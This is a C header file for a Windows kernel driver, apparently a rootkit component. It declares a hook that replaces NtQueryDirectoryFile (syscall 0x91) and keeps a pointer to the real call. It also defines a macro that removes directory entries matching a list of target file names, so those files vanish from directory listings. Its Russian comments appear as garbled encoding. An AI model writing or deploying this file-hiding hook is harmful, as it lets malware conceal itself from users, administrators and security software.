#ifndef _FILE_H_
#define _FILE_H_

#include "inc.h"

#define NUMBER_NT_QUERY_DIRECTORY_FILE 0x91 	

//
// ¬спомогательный макрос, осуществл€ющий единообразную фильтрацию в запросах
// к каталогам с разными структурами (все структуры содержат одинаковые пол€,
// необходимые дл€ фильтрации).
//
#define FILTER_LIST_DIR(EntryType, listDirBuffer, listDirSize, newListDirLength)   \
    {\
        EntryType *currentEntry = (EntryType*) listDirBuffer;\
        EntryType *lastEntry = NULL;\
        PCHAR copyPosition = (PCHAR) listDirBuffer;\
        while (TRUE) {\
            ULONG_PTR offset = currentEntry->NextEntryOffset;\
            ULONG_PTR copySize;\
            BOOL isHide = FALSE;\
            if (offset == 0) {\
                copySize = listDirSize - (copyPosition - listDirBuffer);\
            }\
            else {\
                copySize = offset;\
            }\
    \
            \
            PLIST_ENTRY currEntry;\
            for(currEntry = glControlFilesListHead.Flink; currEntry != &glControlFilesListHead; currEntry = currEntry->Flink){\
                PCONTROL currControl = CONTAINING_RECORD(currEntry, CONTROL, listEntry);\
		        if (!wcsncmp(currentEntry->FileName, currControl->targetValue, currentEntry->FileNameLength / 2)) {\
		        \
                    newListDirLength -= copySize;\
                    if ( (currentEntry->NextEntryOffset == 0) && (lastEntry != NULL) ) {\
                        lastEntry->NextEntryOffset = 0;\
                    }\
                    isHide = TRUE;\
                    break;\
                }\
            }\
            if (!isHide) {\
		        \
                if (copyPosition != (PCHAR)currentEntry) {\
                    RtlCopyMemory (copyPosition, currentEntry, copySize);\
                }\
                lastEntry = currentEntry;\
                copyPosition += copySize;\
            }\
    \
            if (offset == 0) {\
                break;\
            }\
    \
            currentEntry = (EntryType*)((PCHAR)currentEntry + offset);\
        }\
    }

typedef NTSTATUS(*NT_QUERY_DIRECTORY_FILE)(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
	);

typedef struct _TASK_QUEUE_FILE {

    PCHAR filename;
    LIST_ENTRY link;

} TASK_QUEUE_FILE, * PTASK_QUEUE_FILE;

LIST_ENTRY glTaskQueueFile;
PAGED_LOOKASIDE_LIST glPagedTaskQueueFile;

NTSTATUS NTAPI HookNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
);

NT_QUERY_DIRECTORY_FILE glRealNtQueryDirectoryFile;

VOID TaskQueueByFilename(PCHAR filename);
VOID PrintTaskQueueFileList();
VOID FreeListQueueFilename();
#endif // !_FILE_H_
